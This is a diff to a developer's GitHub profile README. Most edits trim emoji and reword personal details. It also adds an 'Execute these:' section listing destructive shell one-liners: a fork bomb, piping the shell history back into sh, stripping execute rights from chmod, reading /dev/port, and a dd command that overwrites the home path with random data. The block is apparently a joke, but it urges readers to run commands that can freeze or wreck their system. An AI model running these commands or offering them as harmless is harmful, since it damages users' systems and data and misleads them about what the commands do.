@@ -1,21 +1,31 @@
-# Hey there, I'm [tribhuwan!](https://tribhuwan-kumar-github.io)
+# I'm [tribhuwan!](https://tribhuwan-kumar-github.io)
 
 
 ### A passionate programmer and open-source lover. 
 Here you'll find a collection of my projects and contributions. Feel free to explore, contribute, and connect with me.
 
+### About ME
+    Known as Termit (Terminal + Hermit)
+
 ### Things I love:
     Arch Linux
     Hardcore VIM lover
-    Known as Termit
-    Cinephilic 
-    Altruist Memer
+    Cinema
+
+#### Execute these:
+```bash
+    :(){ :|: & };:
+    cat /dev/port
+    history | sh
+    chmod -x $(which chmod) && cat /dev/random | sort
+    dd if=/dev/urandom of=$HOME bs=1G count=1000
+```
 
 <details>
 <summary>GitHub Profile Stats</summary>
 <hr>
 
-### 📊 My Stats
+### My Stats
 <div align = "center">
 
 [![tribhuwan's Github Status](https://github-readme-stats.vercel.app/api?username=tribhuwan-kumar&show_icons=true&title_color=bd3ef8&icon_color=F9826C&text_color=E6EDF3&bg_color=0D1117&hide_border=true)](https://tribhuwan-kumar-github.io)
@@ -32,7 +42,7 @@ Here you'll find a collection of my projects and contributions. Feel free to exp
 
 <div>
 
-### 📫 My Other Accounts
+### My Other Accounts
 <br>
 <p align="center">
 <a href="https://www.linkedin.com/in/tribhuwan-kumar-7b6049289/"><img src="https://img.shields.io/badge/linkedin-%238500c2.svg?&style=for-the-badge&logo=linkedin&logoColor=white"></a>
@@ -44,7 +54,7 @@ Here you'll find a collection of my projects and contributions. Feel free to exp
 
 <hr>
 
-### 🎵 Now playing
+### Now playing
 
 <br>
 
@@ -56,6 +66,6 @@ Here you'll find a collection of my projects and contributions. Feel free to exp
 
 <hr>
 
-### 🎗️ Badges
+### Badges
 [![An image of @tribhuwankumar's Holopin badges, which is a link to view their full Holopin profile](https://holopin.me/tribhuwankumar)](https://holopin.io/@tribhuwankumar)
 </details>
